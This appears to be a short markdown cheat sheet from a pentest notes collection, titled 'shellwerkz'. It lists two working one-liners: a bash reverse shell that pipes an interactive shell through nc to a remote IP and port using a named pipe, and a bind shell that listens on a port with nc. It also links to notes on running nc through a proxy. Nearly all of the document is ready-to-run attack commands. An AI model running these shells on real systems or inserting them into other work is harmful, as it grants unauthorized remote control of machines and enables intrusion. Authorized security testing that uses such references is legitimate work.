# shellwerkz

# Reverse shell
## bash
```bash
mkfifo /tmp/ffifo; /bin/bash -i < /tmp/ffifo 2>&1 | nc $remote_ip $port > /tmp/ffifo
```
You may need to use [`nc` with a proxy](./netcat.md).

# Bind shell
```bash
mkfifo /tmp/f
/bin/sh -i 2>&1 < /tmp/f | nc -lvp $port > /tmp/f
```